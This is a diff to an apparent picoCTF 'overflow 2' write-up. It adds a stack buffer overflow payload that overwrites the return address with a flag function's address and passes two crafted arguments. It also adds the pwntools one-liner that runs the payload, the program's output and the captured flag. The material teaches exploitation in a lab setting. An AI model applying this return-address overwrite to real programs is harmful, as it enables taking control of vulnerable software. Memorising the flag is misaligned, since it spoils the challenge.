@@ -316,4 +316,20 @@ Now we need to grab the address of the ```flag``` function. We can use ```Radare
     ...
 [0x080484d0]> q
 ```
-Now we have everything to build our payload.
+Now we have everything to build our payload. Our payload will consist of this:
+- "A" * 188 <-- Fills Buffer space
+- p32(0x080485e6) <-- Address of the ```flag``` function
+- "A" * 4 <--- padding for the 2nd return address
+- p32(0xDEADBEEF) <-- First argument
+- p32(0xC0DED00D) <-- Second Argument
+
+Now, if we navigate to ```/problems/overflow-2_1_210f23786438d7f7e527f4901367a74b``` and execute the following command, we can grab the flag.
+```
+$ python -c "from pwn import *; print 'A' * 188 + p32(0x080485e6) + 'A' * 4 + p32(0xDEADBEEF) + p32(0xC0DED00D)" | ./vuln
+Please enter your string:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
+picoCTF{arg5_and_r3turn5001d1db0}
+Segmentation fault (core dumped)
+```
+Flag:```picoCTF{arg5_and_r3turn5001d1db0}```
+<br>
